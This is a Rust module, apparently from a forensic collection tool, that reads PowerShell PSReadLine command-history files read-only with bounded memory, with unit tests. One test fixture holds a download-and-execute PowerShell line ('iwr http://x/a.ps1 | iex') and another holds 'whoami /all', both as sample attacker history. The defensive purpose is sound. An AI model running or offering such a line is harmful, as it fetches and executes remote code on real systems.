//! PowerShell PSReadLine command history (`ConsoleHost_history.txt`), one
//! `Record::CommandHistory` per line. PSReadLine appends every interactive command to
//! `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`, so the
//! file is a direct record of what an operator typed (T1059.001), even when script
//! block logging is off.
//!
//! Read-only (open for read, never write). Memory is bounded: the file is streamed and
//! only the last [`MAX_LINES`] lines (each capped at [`MAX_LINE_BYTES`]) are kept.

use cairn_core::record::CommandHistoryRecord;
use chrono::{DateTime, Utc};
use std::collections::VecDeque;
use std::io::{BufRead, BufReader, Read};

/// Lines kept per history file (the tail).
pub const MAX_LINES: usize = 500;
/// Bytes kept per line; a longer line is truncated (still counted as one line).
pub const MAX_LINE_BYTES: usize = 8 * 1024;

/// Path of the PSReadLine history below a profile folder.
const PSREADLINE_REL: &str =
    r"AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";

/// `(user, history path)` for every profile folder in `homes` (user = folder name).
pub fn psreadline_paths(homes: &[String]) -> Vec<(String, String)> {
    let mut out: Vec<(String, String)> = Vec::new();
    for home in homes {
        let home = home.trim_end_matches(['\\', '/']);
        let user = home.rsplit(['\\', '/']).next().unwrap_or(home).to_string();
        let path = format!(r"{home}\{PSREADLINE_REL}");
        if !out.iter().any(|(_, p)| p.eq_ignore_ascii_case(&path)) {
            out.push((user, path));
        }
    }
    out
}

/// Stream `r` and return the last `max_lines` lines as `(1-based line number, text)`.
/// Each line keeps at most `max_line_bytes` bytes; `\r\n` / `\n` endings and a leading
/// UTF-8 BOM are removed; decoding is lossy UTF-8. Blank lines are counted but not
/// returned. Memory is O(max_lines * max_line_bytes) regardless of the file size.
pub fn tail_lines<R: Read>(
    r: R,
    max_lines: usize,
    max_line_bytes: usize,
) -> std::io::Result<Vec<(u64, String)>> {
    tail_lines_counted(r, max_lines, max_line_bytes).map(|t| t.lines)
}

/// What [`tail_lines_counted`] read: the kept lines plus whether a cap dropped data.
#[derive(Debug, Default)]
pub struct Tail {
    pub lines: Vec<(u64, String)>,
    /// Lines in the whole stream (blank ones included).
    pub total_lines: u64,
    /// At least one line was longer than the per-line cap and was cut.
    pub cut_long_line: bool,
}

/// [`tail_lines`], also reporting the total line count and whether a line was cut, so
/// a caller can record that a cap was hit.
pub fn tail_lines_counted<R: Read>(
    r: R,
    max_lines: usize,
    max_line_bytes: usize,
) -> std::io::Result<Tail> {
    let mut cut_long_line = false;
    let mut reader = BufReader::new(r);
    let mut ring: VecDeque<(u64, Vec<u8>)> = VecDeque::with_capacity(max_lines.min(1024));
    let mut cur: Vec<u8> = Vec::new();
    let mut line_no: u64 = 0;
    let mut in_line = false;

    let flush = |cur: &mut Vec<u8>, line_no: u64, ring: &mut VecDeque<(u64, Vec<u8>)>| {
        if max_lines == 0 {
            cur.clear();
            return;
        }
        if ring.len() == max_lines {
            ring.pop_front();
        }
        ring.push_back((line_no, std::mem::take(cur)));
    };

    loop {
        let buf = reader.fill_buf()?;
        if buf.is_empty() {
            break;
        }
        let n = buf.len();
        let mut start = 0;
        while start < n {
            if !in_line {
                in_line = true;
                line_no += 1;
            }
            match buf[start..].iter().position(|&c| c == b'\n') {
                Some(i) => {
                    let room = max_line_bytes.saturating_sub(cur.len());
                    cut_long_line |= i > room;
                    cur.extend_from_slice(&buf[start..start + i.min(room)]);
                    flush(&mut cur, line_no, &mut ring);
                    in_line = false;
                    start += i + 1;
                }
                None => {
                    let room = max_line_bytes.saturating_sub(cur.len());
                    cut_long_line |= n - start > room;
                    cur.extend_from_slice(&buf[start..start + (n - start).min(room)]);
                    start = n;
                }
            }
        }
        reader.consume(n);
    }
    if in_line {
        flush(&mut cur, line_no, &mut ring);
    }

    let lines = ring
        .into_iter()
        .filter_map(|(no, bytes)| {
            let mut s = String::from_utf8_lossy(&bytes).into_owned();
            if no == 1 {
                s = s.trim_start_matches('\u{feff}').to_string();
            }
            let s = s.trim_end_matches('\r').to_string();
            (!s.trim().is_empty()).then_some((no, s))
        })
        .collect();
    Ok(Tail {
        lines,
        total_lines: line_no,
        cut_long_line,
    })
}

/// Build the records for one history file from an already-opened reader. Pure given `r`.
pub fn history_records<R: Read>(
    user: &str,
    path: &str,
    r: R,
    last_write: Option<DateTime<Utc>>,
) -> Vec<CommandHistoryRecord> {
    let Ok(lines) = tail_lines(r, MAX_LINES, MAX_LINE_BYTES) else {
        return Vec::new();
    };
    lines
        .into_iter()
        .map(|(line_no, command)| CommandHistoryRecord {
            user: user.to_string(),
            path: path.to_string(),
            line_no,
            command,
            last_write,
        })
        .collect()
}

/// Read every existing PSReadLine history for `homes`. Read-only: `File::open` (read
/// access) only; a missing or unreadable file is skipped.
pub fn read_psreadline_history(homes: &[String]) -> Vec<CommandHistoryRecord> {
    read_psreadline_history_noted(homes, &mut Vec::new())
}

/// [`read_psreadline_history`], adding one note per file whose tail or line-length cap
/// was hit (for the manifest: a capped read is partial, and must say so).
pub fn read_psreadline_history_noted(
    homes: &[String],
    notes: &mut Vec<String>,
) -> Vec<CommandHistoryRecord> {
    let mut out = Vec::new();
    for (user, path) in psreadline_paths(homes) {
        if cairn_core::paths::must_not_probe(&path) {
            continue;
        }
        let Ok(f) = std::fs::File::open(&path) else {
            continue;
        };
        let last_write = f
            .metadata()
            .ok()
            .and_then(|m| m.modified().ok())
            .map(DateTime::<Utc>::from);
        let Ok(tail) = tail_lines_counted(f, MAX_LINES, MAX_LINE_BYTES) else {
            continue;
        };
        out.extend(records_from_tail(&user, &path, tail, last_write, notes));
    }
    out
}

/// Records for one file's tail, noting the caps it hit.
fn records_from_tail(
    user: &str,
    path: &str,
    tail: Tail,
    last_write: Option<DateTime<Utc>>,
    notes: &mut Vec<String>,
) -> Vec<CommandHistoryRecord> {
    if tail.total_lines > MAX_LINES as u64 {
        notes.push(format!(
            "{path}: {} lines, only the last {MAX_LINES} read (cap)",
            tail.total_lines
        ));
    }
    if tail.cut_long_line {
        notes.push(format!(
            "{path}: line(s) longer than {MAX_LINE_BYTES} bytes cut (cap)"
        ));
    }
    tail.lines
        .into_iter()
        .map(|(line_no, command)| CommandHistoryRecord {
            user: user.to_string(),
            path: path.to_string(),
            line_no,
            command,
            last_write,
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Cursor;

    #[test]
    fn paths_per_profile_with_user_name() {
        let homes = vec![
            r"C:\Users\alice".to_string(),
            r"C:\Users\bob\".to_string(),
            r"c:\users\ALICE".to_string(),
        ];
        let p = psreadline_paths(&homes);
        assert_eq!(p.len(), 2, "{p:?}");
        assert_eq!(p[0].0, "alice");
        assert_eq!(
            p[0].1,
            r"C:\Users\alice\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
        );
        assert_eq!(p[1].0, "bob");
    }

    /// Hitting the line or line-length cap is noted; a short file adds no note.
    #[test]
    fn caps_are_noted() {
        let text: String = (1..=600).map(|i| format!("cmd {i}\n")).collect();
        let tail = tail_lines_counted(Cursor::new(text.into_bytes()), MAX_LINES, 16).unwrap();
        assert_eq!(tail.total_lines, 600);
        assert!(!tail.cut_long_line);
        let mut notes = Vec::new();
        let recs = records_from_tail("u", "p", tail, None, &mut notes);
        assert_eq!(recs.len(), MAX_LINES);
        assert_eq!(notes.len(), 1, "{notes:?}");
        assert!(notes[0].contains("600 lines"), "{notes:?}");

        let long = format!("{}\nshort\n", "x".repeat(100));
        let tail = tail_lines_counted(Cursor::new(long.into_bytes()), MAX_LINES, 10).unwrap();
        assert!(tail.cut_long_line);
        let mut notes = Vec::new();
        records_from_tail("u", "p", tail, None, &mut notes);
        assert!(notes[0].contains("longer than"), "{notes:?}");

        let tail = tail_lines_counted(Cursor::new(b"a\nb\n".to_vec()), MAX_LINES, 10).unwrap();
        let mut notes = Vec::new();
        records_from_tail("u", "p", tail, None, &mut notes);
        assert!(notes.is_empty());
    }

    /// Random bytes (CR/LF soup, invalid UTF-8, tiny caps) never panic the tail reader.
    #[test]
    fn fuzzed_history_never_panics() {
        let mut rng = cairn_core::fuzz::Rng::new(0x415);
        for i in 0..2000 {
            let bytes = rng.bytes(512);
            let _ = tail_lines_counted(Cursor::new(bytes), i % 7, i % 13).unwrap();
        }
    }

    #[test]
    fn keeps_only_the_last_n_lines_with_real_line_numbers() {
        let text: String = (1..=1200).map(|i| format!("cmd {i}\r\n")).collect();
        let got = tail_lines(Cursor::new(text.into_bytes()), 500, MAX_LINE_BYTES).unwrap();
        assert_eq!(got.len(), 500);
        assert_eq!(got[0], (701, "cmd 701".to_string()));
        assert_eq!(got[499], (1200, "cmd 1200".to_string()));
    }

    #[test]
    fn strips_bom_skips_blank_and_keeps_unterminated_last_line() {
        let text = "\u{feff}first\n\n   \nwhoami /all";
        let got = tail_lines(Cursor::new(text.as_bytes().to_vec()), 10, 100).unwrap();
        assert_eq!(
            got,
            vec![(1, "first".to_string()), (4, "whoami /all".to_string())]
        );
    }

    #[test]
    fn long_line_is_truncated_not_unbounded() {
        let mut text = "a".repeat(100_000);
        text.push_str("\nnext\n");
        let got = tail_lines(Cursor::new(text.into_bytes()), 10, 64).unwrap();
        assert_eq!(got[0].1.len(), 64);
        assert_eq!(got[1], (2, "next".to_string()));
    }

    /// A tiny BufReader capacity is simulated by a reader that returns 1 byte per read,
    /// so line boundaries straddle buffer refills.
    #[test]
    fn line_split_across_reads() {
        struct OneByte(Vec<u8>, usize);
        impl Read for OneByte {
            fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
                if self.1 >= self.0.len() || buf.is_empty() {
                    return Ok(0);
                }
                buf[0] = self.0[self.1];
                self.1 += 1;
                Ok(1)
            }
        }
        let got = tail_lines(OneByte(b"ab\r\ncd\nef".to_vec(), 0), 2, 100).unwrap();
        assert_eq!(got, vec![(2, "cd".to_string()), (3, "ef".to_string())]);
    }

    #[test]
    fn history_records_carry_user_path_and_mtime() {
        let recs = history_records(
            "alice",
            r"C:\h.txt",
            Cursor::new(b"iwr http://x/a.ps1 | iex\n".to_vec()),
            None,
        );
        assert_eq!(recs.len(), 1);
        assert_eq!(recs[0].user, "alice");
        assert_eq!(recs[0].line_no, 1);
        assert_eq!(recs[0].command, "iwr http://x/a.ps1 | iex");
    }

    #[test]
    fn read_from_real_file_is_read_only_and_skips_missing() {
        // On Linux the `\`-joined tail is one file name inside `base`; on Windows it is
        // the real nested path. Either way it is the exact path psreadline_paths builds.
        let base = std::env::temp_dir().join(format!("cairn_psrl_{}", std::process::id()));
        let home = base.join("alice");
        std::fs::create_dir_all(&home).unwrap();
        let home_s = home.to_string_lossy().to_string();
        let (_, path) = psreadline_paths(std::slice::from_ref(&home_s))
            .pop()
            .unwrap();
        let p = std::path::Path::new(&path);
        if let Some(parent) = p.parent() {
            std::fs::create_dir_all(parent).unwrap();
        }
        std::fs::write(p, "Get-Process\n").unwrap();
        let before = std::fs::read(p).unwrap();
        let recs = read_psreadline_history(&[home_s, "/nonexistent/cairn".into()]);
        let after = std::fs::read(p).unwrap();
        let _ = std::fs::remove_dir_all(&base);
        assert_eq!(before, after, "history file must not be modified");
        assert_eq!(recs.len(), 1);
        assert_eq!(recs[0].command, "Get-Process");
        assert!(recs[0].last_write.is_some());
    }
}
